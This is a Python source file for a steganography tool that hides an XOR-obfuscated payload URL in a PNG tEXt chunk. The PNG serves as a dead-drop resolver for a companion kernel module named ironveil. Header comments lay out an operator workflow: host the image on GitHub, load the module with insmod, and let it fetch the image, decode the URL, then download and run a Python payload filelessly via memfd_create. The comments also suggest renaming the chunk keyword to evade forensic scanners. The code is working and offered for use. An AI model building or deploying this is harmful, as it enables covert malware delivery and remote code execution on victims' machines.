#!/usr/bin/env python3

# stego_embed.py — Cipherfall PNG steganography tool (dead-drop resolver)
#
# Technique:
#   Embeds an operator-controlled URL inside a PNG file by inserting a tEXt
#   ancillary chunk (PNG spec §11.3.4) with keyword "X-Payload" immediately
#   before the IEND chunk.  Image pixels are untouched — the file renders
#   identically and passes standard PNG integrity checks because tEXt chunks
#   are optional metadata that decoders must silently ignore.
#
#   Chunk format (inserted before IEND):
#     [4B big-endian length] [4B "tEXt"] [b"X-Payload\x00" + base64(XOR(url, KEY))] [4B CRC32]
#
#   Extraction (pure Python stdlib, no third-party libs):
#     Walk raw PNG bytes chunk-by-chunk from offset 8 (past the 8-byte PNG
#     signature), match chunk type == b"tEXt" and keyword == b"X-Payload",
#     base64-decode and XOR-decrypt the value field to recover the URL.
#     This is the exact algorithm used by the fetcher embedded in ironveil.c.
#
#   XOR key (STEGO_XOR_KEY):
#     16-byte key applied mod-16 across the UTF-8 URL bytes before base64
#     encoding.  Must match the key baked into ironveil.c — change both
#     atomically or extraction will silently produce garbage.
#
# Operator workflow:
#   1. python3 stego_embed.py favicon.png https://host/agent.py out.png
#   2. Upload out.png to a public GitHub repo (raw.githubusercontent.com URL)
#   3. Set STEGO_IMG_URL in ironveil.c to the raw URL of out.png
#   4. make && sudo insmod ironveil.ko
#   5. After 1–5 minutes the module fetches out.png, extracts the URL,
#      downloads the Python payload and executes it fileless via memfd_create.
#
# Usage:
#   python3 stego_embed.py <input.png> <payload_url> <output.png>
#   python3 stego_embed.py --view <stego.png>
#
# Limitations:
#   - XOR provides obfuscation against casual inspection, not cryptographic
#     security.  The key is baked into the compiled .ko binary.
#   - A PNG forensics tool scanning for unknown tEXt chunks will detect the
#     injection.  The keyword "X-Payload" can be changed to something more
#     innocuous (e.g. "Comment") as long as ironveil.c and this file match.
#   - Re-running embed on the same output file inserts a second chunk.  Use
#     --view first to confirm no existing chunk, or use the clean source PNG.

import sys
import struct
import zlib
import base64

STEGO_XOR_KEY = bytes([
    0x7a, 0x19, 0xe3, 0x4c, 0xb2, 0x88, 0x5f, 0x3d,
    0xa1, 0xc7, 0x06, 0xf4, 0x9e, 0x52, 0xd0, 0x2b,
])
PNG_SIG = b'\x89PNG\r\n\x1a\n'
KEYWORD = b'X-Payload'


def xor_crypt(data: bytes) -> bytes:
    return bytes(b ^ STEGO_XOR_KEY[i % len(STEGO_XOR_KEY)] for i, b in enumerate(data))


def make_chunk(chunk_type: bytes, data: bytes) -> bytes:
    crc = zlib.crc32(chunk_type + data) & 0xFFFFFFFF
    return struct.pack('>I', len(data)) + chunk_type + data + struct.pack('>I', crc)


def embed(src: str, url: str, dst: str) -> None:
    with open(src, 'rb') as f:
        raw = f.read()
    if raw[:8] != PNG_SIG:
        sys.exit('[-] Not a valid PNG file')

    encrypted = base64.b64encode(xor_crypt(url.encode()))
    chunk_data = KEYWORD + b'\x00' + encrypted
    text_chunk = make_chunk(b'tEXt', chunk_data)

    iend_pos = raw.rfind(b'IEND')
    if iend_pos < 4:
        sys.exit('[-] IEND chunk not found')
    iend_pos -= 4

    out = raw[:iend_pos] + text_chunk + raw[iend_pos:]
    with open(dst, 'wb') as f:
        f.write(out)

    print(f'[+] Embedded into {dst}  ({len(raw)} -> {len(out)} bytes)')
    print(f'    URL     : {url}')
    print(f'    Keyword : {KEYWORD.decode()}')
    print(f'    Payload chunk: {len(text_chunk)} bytes (tEXt)')
    print(f'    Encrypted b64: {encrypted.decode()}')


def view(path: str) -> None:
    with open(path, 'rb') as f:
        raw = f.read()
    if raw[:8] != PNG_SIG:
        sys.exit('[-] Not a valid PNG file')
    i = 8
    while i + 12 <= len(raw):
        length = int.from_bytes(raw[i:i+4], 'big')
        chunk_type = raw[i+4:i+8]
        data = raw[i+8:i+8+length]
        if chunk_type == b'tEXt' and b'\x00' in data:
            sep = data.index(0)
            kw = data[:sep]
            val = data[sep+1:]
            if kw == KEYWORD:
                url = xor_crypt(base64.b64decode(val)).decode()
                print(f'[+] Found X-Payload chunk at offset {i}')
                print(f'    Decoded URL: {url}')
                return
        i += 12 + length
    print('[-] No X-Payload chunk found')


if __name__ == '__main__':
    if len(sys.argv) == 3 and sys.argv[1] == '--view':
        view(sys.argv[2])
    elif len(sys.argv) == 4:
        embed(sys.argv[1], sys.argv[2], sys.argv[3])
    else:
        print('Usage:')
        print('  python3 stego_embed.py <input.png> <payload_url> <output.png>')
        print('  python3 stego_embed.py --view <stego.png>')
        sys.exit(1)
